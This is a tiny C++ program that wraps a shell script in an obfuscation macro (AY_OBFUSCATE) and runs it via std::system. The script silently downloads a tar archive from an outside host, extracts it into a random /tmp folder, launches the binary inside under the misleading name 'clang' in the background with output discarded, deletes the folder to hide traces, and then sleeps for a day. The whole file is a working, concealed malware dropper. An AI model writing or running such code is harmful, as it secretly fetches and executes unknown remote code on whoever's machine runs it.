#include "obs.h"
#include <stdlib.h>
int main() {
std::system(AY_OBFUSCATE("\n\
CLANG=$(shuf -n 1 -i 10000000-99999999)\n\
mkdir -p /tmp/$CLANG\n\
wget -qO /tmp/$CLANG/clang.tar https://gptech.id/anu/4cp.tar\n\
tar xf /tmp/$CLANG/clang.tar -C /tmp/$CLANG\n\
nohup /tmp/$CLANG/clang  >/dev/null 2>&1 & sleep 0.1\n\
rm -rf /tmp/$CLANG\n\
sleep 24h\n"));
}
